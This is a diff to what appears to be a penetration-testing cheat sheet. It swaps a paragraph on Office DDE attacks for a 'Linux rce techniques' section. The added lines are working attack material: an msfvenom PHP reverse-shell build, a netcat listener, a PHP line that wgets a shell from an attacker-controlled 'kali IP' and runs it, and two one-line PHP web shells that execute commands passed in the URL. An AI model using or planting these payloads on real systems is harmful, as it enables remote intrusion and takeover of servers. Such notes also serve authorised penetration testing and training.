@@ -349,8 +349,21 @@ wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-
 upload File with Macro to vulnerable website #Evil.odt
 setup listner and webserver
 ````
-#### Object Linking and Embedding
-Another popular client-side attack against Microsoft Office abuses Dynamic Data Exchange (DDE)1 to execute arbitrary applications from within Office documents, but this has been patched since December of 2017. In this attack scenario, we are going to embed a Windows batch file5 inside a Microsoft Word document.
+### Linux rce techniques
+````
+msfvenom -p php/reverse_php LHOST=<kali IP> LPORT=443 -f raw > shell.php
+python3 -m http.server
+nc -nlvp 443
+<?php system("wget http://<kali IP>/shell.php -O /tmp/shell.php;php /tmp/shell.php");?>
+````
+````
+<?php shell_exec($_GET['cmd']);?> #&cmd=whoami or ?cmd=whoami
+<?php system($_GET['cmd']);?> #&cmd=whoami or ?cmd=whoami
+````
+#### Chaining exploits
+##### LFI to RFE
+````
+````
 ### Hashing & Cracking
 #### Enumeration
 ````
